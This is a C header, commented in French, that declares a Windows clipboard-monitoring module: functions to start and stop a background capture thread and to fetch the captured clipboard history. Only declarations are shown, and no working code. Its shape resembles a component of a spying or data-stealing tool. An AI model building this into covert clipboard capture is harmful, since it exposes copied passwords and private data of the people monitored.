/*
 * clipboard.h - Module de surveillance du presse-papier
 */

#ifndef CLIPBOARD_H
#define CLIPBOARD_H

#include "../common.h"

/*
 * Démarre le thread de surveillance du presse-papier
 * Retourne TRUE si démarré avec succès, FALSE sinon
 */
bool Clipboard_Start(void);

/*
 * Arrête le thread de surveillance du presse-papier
 */
void Clipboard_Stop(void);

/*
 * Récupère l'historique du presse-papier capturé
 * Le buffer est alloué par la fonction et doit être libéré par l'appelant
 * 
 * @param buffer Pointeur pour recevoir l'adresse du buffer
 * @param size Pointeur pour recevoir la taille du buffer
 * @return TRUE si des données ont été récupérées, FALSE sinon
 */
bool Clipboard_GetBuffer(char** buffer, DWORD* size);

/*
 * Vérifie si le moniteur de presse-papier est en cours d'exécution
 * @return TRUE si en cours, FALSE sinon
 */
bool Clipboard_IsRunning(void);

#endif /* CLIPBOARD_H */
